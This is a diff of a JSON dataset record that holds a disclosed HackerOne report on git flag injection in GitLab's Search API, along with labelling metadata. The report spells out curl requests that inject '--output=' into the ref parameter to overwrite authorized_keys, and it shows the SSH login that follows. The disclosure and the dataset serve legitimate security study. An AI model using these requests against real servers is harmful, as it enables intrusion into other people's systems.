@@ -1,42 +1,46 @@
 {
-    "reported_to": "GitLab",
-    "reported_by": "vakzz ",
-    "title": "Git flag injection - local file overwrite to remote code execution",
-    "content": "\nSummary\nThe wiki_blobs scope of the Search API can be provided with an arbitrary ref parameter, allowing for additional flags to be injected into the git command.\nFor example the following API call:\nCode 141 Bytes\n1`curl --header \"PRIVATE-TOKEN: $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'`\nThe above will generate the following git command causing the the last commit log to be written to /tmp/file\nCode 201 Bytes\n1/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.wiki.git log --max-count=1 --output=/tmp/file\nSteps to reproduce\nCreate a wiki new wiki page called page with the commit message controlled content\nSearch for the wiki blob via the Search API, with the injected ref flag:\nCode 139 Bytes\n1curl --header \"PRIVATE-TOKEN: $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'\nSee that the file has been created:\nCode 183 Bytes\n1git@gitlab-vm:~$ cat /tmp/file\n2commit f00f9538d29b176e9dfb2eb1bfe1eab190cad3d9\n3Author: Administrator <admin@example.com>\n4Date:   Wed Jul 24 13:08:51 2019 +0000\n5\n6    controlled content\nImpact\nThis can be used to overwrite /var/opt/gitlab/.ssh/authorized_keys with an attackers key by following the above steps allowing remote access and code execution.\nCreate a new rsa key\nCreate a new wiki page setting the commit message to the rsa public key\nRun the Search API with ref=--output=/var/opt/gitlab/.ssh/authorized_keys\nssh into gitlab using the created key:\nCode 730 Bytes\n1$ ssh git@gitlab-vm.local -i gitlab\n2Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-70-generic x86_64)\n3$ id\n4uid=998(git) gid=998(git) groups=998(git)\n5\n6$ cat /var/opt/gitlab/.ssh/authorized_keys\n7commit 00c8e52996654d02bcbdba47dc25ee73671cbfd6\n8Author: Administrator <admin@example.com>\n9Date:   Wed Jul 24 12:56:23 2019 +0000\n10\n11    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxsqkWZobL5DBOnM3rtE7ZDP4d9v0lABJRGJbovHHTNY2iH3x3pjjerPfLDO21Gkyfzn4J+x6O6GleMAB5nxnZRH7E44khfW6Ldql29Rv2Q/IYCsBSKxGT6RCOFusoRi1uHlQmexIh4gZkmPeFfDLTy70Xv3FpPLfKE/EiVOjuEtY9JUC4MVlPHaTzZ2HE4sZT5tvcm9YtSpjT2v0SMR8uCXcKMAx4Tsu/Un2N5UziXgtRF+vD0fRhNyKIkOtULwBgWkL5RE71vYbxOhviqTAld7r70TIWSzSUHcUewbMS5XcEdBwl3XI/9qzo+jOA0Ulf2bkkROpELBoHwfLdpu9p will@MacBook-Pro.local\nWhat is the current bug behavior?\nThe ref param is passed directly to the git command without being sanitized.\nWhat is the expected correct behavior?\nThe ref param should be sanitized or used in a way that doesn't allow for flag injection\nResults of GitLab environment info\nCode 845 Bytes\n1$ sudo gitlab-rake gitlab:env:info\n2\n3System information\n4System:\t\tUbuntu 16.04\n5Current User:\tgit\n6Using RVM:\tno\n7Ruby Version:\t2.6.3p62\n8Gem Version:\t2.7.9\n9Bundler Version:1.17.3\n10Rake Version:\t12.3.2\n11Redis Version:\t3.2.12\n12Git Version:\t2.21.0\n13Sidekiq Version:5.2.7\n14Go Version:\tunknown\n15\n16GitLab information\n17Version:\t12.1.0\n18Revision:\t295480f4553\n19Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n20DB Adapter:\tPostgreSQL\n21DB Version:\t10.7\n22URL:\t\thttp://gitlab-vm.local\n23HTTP Clone URL:\thttp://gitlab-vm.local/some-group/some-project.git\n24SSH Clone URL:\tgit@gitlab-vm.local:some-group/some-project.git\n25Using LDAP:\tno\n26Using Omniauth:\tyes\n27Omniauth Providers:\n28\n29GitLab Shell\n30Version:\t9.3.0\n31Repository storage paths:\n32- default: \t/var/opt/gitlab/git-data/repositories\n33GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n34Git:\t\t/opt/gitlab/embedded/bin/git\nImpact\nAn attacker can overwrite or create files with mostly controlled content, allowing them to gain remote ssh access to gitlab as the git user\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "GitLab",
+  "reported_by": "vakzz ",
+  "title": "Git flag injection - local file overwrite to remote code execution",
+  "content": "\nSummary\nThe wiki_blobs scope of the Search API can be provided with an arbitrary ref parameter, allowing for additional flags to be injected into the git command.\nFor example the following API call:\nCode 141 Bytes\n1`curl --header \"PRIVATE-TOKEN: $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'`\nThe above will generate the following git command causing the the last commit log to be written to /tmp/file\nCode 201 Bytes\n1/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.wiki.git log --max-count=1 --output=/tmp/file\nSteps to reproduce\nCreate a wiki new wiki page called page with the commit message controlled content\nSearch for the wiki blob via the Search API, with the injected ref flag:\nCode 139 Bytes\n1curl --header \"PRIVATE-TOKEN: $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'\nSee that the file has been created:\nCode 183 Bytes\n1git@gitlab-vm:~$ cat /tmp/file\n2commit f00f9538d29b176e9dfb2eb1bfe1eab190cad3d9\n3Author: Administrator <admin@example.com>\n4Date:   Wed Jul 24 13:08:51 2019 +0000\n5\n6    controlled content\nImpact\nThis can be used to overwrite /var/opt/gitlab/.ssh/authorized_keys with an attackers key by following the above steps allowing remote access and code execution.\nCreate a new rsa key\nCreate a new wiki page setting the commit message to the rsa public key\nRun the Search API with ref=--output=/var/opt/gitlab/.ssh/authorized_keys\nssh into gitlab using the created key:\nCode 730 Bytes\n1$ ssh git@gitlab-vm.local -i gitlab\n2Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-70-generic x86_64)\n3$ id\n4uid=998(git) gid=998(git) groups=998(git)\n5\n6$ cat /var/opt/gitlab/.ssh/authorized_keys\n7commit 00c8e52996654d02bcbdba47dc25ee73671cbfd6\n8Author: Administrator <admin@example.com>\n9Date:   Wed Jul 24 12:56:23 2019 +0000\n10\n11    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxsqkWZobL5DBOnM3rtE7ZDP4d9v0lABJRGJbovHHTNY2iH3x3pjjerPfLDO21Gkyfzn4J+x6O6GleMAB5nxnZRH7E44khfW6Ldql29Rv2Q/IYCsBSKxGT6RCOFusoRi1uHlQmexIh4gZkmPeFfDLTy70Xv3FpPLfKE/EiVOjuEtY9JUC4MVlPHaTzZ2HE4sZT5tvcm9YtSpjT2v0SMR8uCXcKMAx4Tsu/Un2N5UziXgtRF+vD0fRhNyKIkOtULwBgWkL5RE71vYbxOhviqTAld7r70TIWSzSUHcUewbMS5XcEdBwl3XI/9qzo+jOA0Ulf2bkkROpELBoHwfLdpu9p will@MacBook-Pro.local\nWhat is the current bug behavior?\nThe ref param is passed directly to the git command without being sanitized.\nWhat is the expected correct behavior?\nThe ref param should be sanitized or used in a way that doesn't allow for flag injection\nResults of GitLab environment info\nCode 845 Bytes\n1$ sudo gitlab-rake gitlab:env:info\n2\n3System information\n4System:\t\tUbuntu 16.04\n5Current User:\tgit\n6Using RVM:\tno\n7Ruby Version:\t2.6.3p62\n8Gem Version:\t2.7.9\n9Bundler Version:1.17.3\n10Rake Version:\t12.3.2\n11Redis Version:\t3.2.12\n12Git Version:\t2.21.0\n13Sidekiq Version:5.2.7\n14Go Version:\tunknown\n15\n16GitLab information\n17Version:\t12.1.0\n18Revision:\t295480f4553\n19Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n20DB Adapter:\tPostgreSQL\n21DB Version:\t10.7\n22URL:\t\thttp://gitlab-vm.local\n23HTTP Clone URL:\thttp://gitlab-vm.local/some-group/some-project.git\n24SSH Clone URL:\tgit@gitlab-vm.local:some-group/some-project.git\n25Using LDAP:\tno\n26Using Omniauth:\tyes\n27Omniauth Providers:\n28\n29GitLab Shell\n30Version:\t9.3.0\n31Repository storage paths:\n32- default: \t/var/opt/gitlab/git-data/repositories\n33GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n34Git:\t\t/opt/gitlab/embedded/bin/git\nImpact\nAn attacker can overwrite or create files with mostly controlled content, allowing them to gain remote ssh access to gitlab as the git user\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 12000,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1576733340,
+  "report_url": "https://hackerone.com/reports/658013",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Create a new wiki page with controlled content (e.g., an SSH public key) in the commit message"
     ],
-    "bounty": 12000,
-    "weaknesses": [
-        "Command Injection - Generic"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1576733340,
-    "report_url": "https://hackerone.com/reports/658013",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Create a new wiki page with controlled content (e.g., an SSH public key) in the commit message"
-        ],
-        [
-            2,
-            "Execute a search API call with the 'ref' parameter containing a malicious flag (e.g., '--output=/var/opt/gitlab/.ssh/authorized_keys')"
-        ]
-    ],
-    "vuln_description": "The vulnerability allows an attacker to inject arbitrary flags into a Git command via the 'ref' parameter in the Search API. This can be exploited to overwrite files on the system, such as the authorized_keys file, leading to remote code execution.",
-    "reason": "The attack involves understanding how the 'ref' parameter is passed to the Git command and recognizing the opportunity for flag injection. While the interaction between the API and Git command is non-obvious, the steps to exploit it are straightforward once identified.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The vulnerability involves injecting flags into a git command via the Search API's ref parameter, which is not directly related to authentication or authorization boundaries being crossed by swapping user sessions or resource IDs. The issue is more about command injection and parameter sanitization rather than AuthN/AuthZ bypass.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Execute a search API call with the 'ref' parameter containing a malicious flag (e.g., '--output=/var/opt/gitlab/.ssh/authorized_keys')"
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to inject arbitrary flags into a Git command via the 'ref' parameter in the Search API. This can be exploited to overwrite files on the system, such as the authorized_keys file, leading to remote code execution.",
+  "reason": "The attack involves understanding how the 'ref' parameter is passed to the Git command and recognizing the opportunity for flag injection. While the interaction between the API and Git command is non-obvious, the steps to exploit it are straightforward once identified.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The vulnerability involves injecting arbitrary flags into a git command via an API parameter, which is not directly related to authentication or authorization boundaries between users or resources. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on parameter injection or command injection vulnerabilities.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The vulnerability involves injecting a simple payload (`--output=...`) into the `ref` parameter of the Search API. The payload does not require encoding or complex bypasses. The API's response may change (e.g., empty search results) if the Git command's output is redirected, allowing same-channel detection via altered HTTP responses. While the full impact (file overwrite) requires external verification (SSH), the injection itself and its immediate effect (altered API behavior) are detectable within the same channel, fitting the methodology's criteria for simple payload testing.",
+    "is_simple_injection": true
+  }
 }
